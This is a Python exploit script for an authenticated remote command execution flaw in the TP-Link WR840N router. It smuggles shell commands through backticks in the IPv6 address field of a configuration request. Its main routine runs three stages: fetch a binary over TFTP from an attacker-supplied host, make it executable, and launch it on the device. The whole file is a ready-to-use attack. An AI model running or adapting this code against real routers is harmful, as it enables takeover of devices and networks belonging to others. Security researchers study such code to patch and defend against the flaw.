#!/usr/bin/python
# -*- coding: utf-8 -*-
# Author: Samir Sanchez Garnica and Luis Jacome Valencia
# Description: This script exploits a remote command execution vulnerability in the TPLink WR840N router, using the IPv6 protocol.

import requests
import base64
import argparse

class RCE():
    def __init__(self, ip, command, username, password):
        self.ip = ip
        self.command = command
        self.username = username
        self.password = password
        self.session = requests.Session()
    
    def base64_encode(self, s):
        msg_bytes = s.encode('ascii')
        return base64.b64encode(msg_bytes)

    def exploit(self):
        # Building the malicious packet
        self.url = "http://" + self.ip + "/cgi?2&2"
        self.proxyes = {}
        self.payload = '[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,2\r\nX_TP_lastUsedIntf=ipoe_eth3_s\r\nX_TP_lastUsedName=ewan_ipoe_s\r\n[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,18\r\nexternalIPAddress=172.26.26.2\r\nsubnetMask=255.255.255.0\r\ndefaultGateway=172.26.26.1\r\nNATEnabled=1\r\nX_TP_FullconeNATEnabled=0\r\nX_TP_FirewallEnabled=1\r\nmaxMTUSize=1500\r\nDNSOverrideAllowed=1\r\nDNSServers=1.1.1.1,8.8.8.8\r\nX_TP_IPv4Enabled=0\r\nX_TP_IPv6Enabled=1\r\nX_TP_IPv6AddressingType=Static\r\nX_TP_ExternalIPv6Address=`'+str(self.command)+'`\r\nX_TP_PrefixLength=128\r\nX_TP_DefaultIPv6Gateway=::\r\nX_TP_IPv6DNSOverrideAllowed=1\r\nX_TP_IPv6DNSServers=::,::\r\nenable=1\r\n'
    
        self.headers = {
            'Host': self.ip,
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'text/plain',
            'Content-Length': 'str(len(self.payload))',
            'Origin': 'http://'+str(self.ip),
            'Referer': 'http://'+str(self.ip)+'/mainFrame.htm',
        }
        
        self.cookies = { 'Authorization' : 'Basic ' + self.base64_encode(self.username + ":" + self.password).decode('ascii') }
        
        self.response = self.session.post(self.url, headers=self.headers, cookies=self.cookies, data=self.payload, proxies=self.proxyes, timeout=10)
        

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--username", dest="username", help="Enter the administrator user of the router", required=True)
    parser.add_argument("--password", dest="password", help="Enter the admin password of the router", required=True)
    parser.add_argument("--target", dest="target", help="Enter router ip address", required=True)
    parser.add_argument("--lhost", dest="lhost", help="Enter your lhost server tfpt", required=True)
    parser.add_argument("--lport", dest="lport", help="Enter your lport received your connection", required=True)
    args = parser.parse_args()
    
    if args.username and args.password and args.target and args.lhost and args.lport:
        commands = ['tftp -g -r s -l/var/tmp/r {}'.format(args.lhost), 'chmod +x /var/tmp/r', '/var/tmp/r &']
        
        for com in commands:
            rce = RCE(args.target, com, args.username, args.password)
            rce.exploit()
            print("[+] Exploiting stage " + str(com))

if __name__ == "__main__":
    main()
